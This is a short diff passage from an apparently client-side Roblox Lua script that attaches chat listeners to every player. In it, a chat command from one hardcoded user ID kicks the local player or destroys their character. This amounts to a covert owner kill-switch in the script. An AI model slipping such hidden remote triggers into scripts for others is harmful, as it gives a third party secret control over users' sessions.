@@ -283,6 +283,8 @@ for i,v in pairs(game.Players:GetPlayers()) do
 				game.Players.LocalPlayer:Kick("User BANNED")
 			end
 		end
+	end)
+	v.Chatted:Connect(function(Message)
 		if Message == ".check "..game.Players.LocalPlayer.Name then
 			if v.UserId == 721287280 then
 				game.Players.LocalPlayer.Character.Head:Destroy()
